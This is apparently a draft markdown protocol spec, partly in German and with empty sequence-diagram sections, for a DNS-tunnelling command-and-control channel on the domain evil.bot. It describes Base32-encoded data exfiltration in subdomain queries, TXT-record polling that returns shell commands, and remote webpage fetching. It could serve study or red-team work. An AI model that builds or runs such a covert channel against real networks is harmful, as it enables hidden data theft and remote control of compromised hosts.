# Domain

evil.bot

# CLIENT -> SERVER

## ENCODING

- Data: Base32 in subdomain
- Commands: Plaintext
- ClientID: Plaintext


### END OF MESSAGE

- 0.[...].evil.bot

## MESSAGE

### A
#### Request ID

- Polling ohne id
- request_id.evil.bot

#### Data
- send data to server
- 0.\<base32>\<data>.[...].\<base32>\<data>.data.\<ClientID>.evil.bot

### TXT

#### Poll

- polling
- poll.<CLientID>.evil.bot

#### Continue

- continue data transmission
- continue.\<ClientID>.evil.bot

#### Curl

- curl a webpage
- 0.\<base32>\<webpage>.[...].\<base32>\<webpage>.curl.\<CLientID>.evil.bot


## SEQUENCE DIAGRAM


# SERVER -> CLIENT

## ENCODING

## RESPONSES

### A

#### Request ID

- \<random>.\<random>.\<random>.\<ClientID>

#### Data

- \<random>.\<random>.\<random>.\<random>

### TXT

#### Poll

##### Noting

- empty string

##### Data

- \<base64?>\<data>

##### shell command

- \<base64?>\<command>


#### Continue

##### Noting

- empty string

##### Data

- \<base64?>\<data>

## SEQUENCE DIAGRAM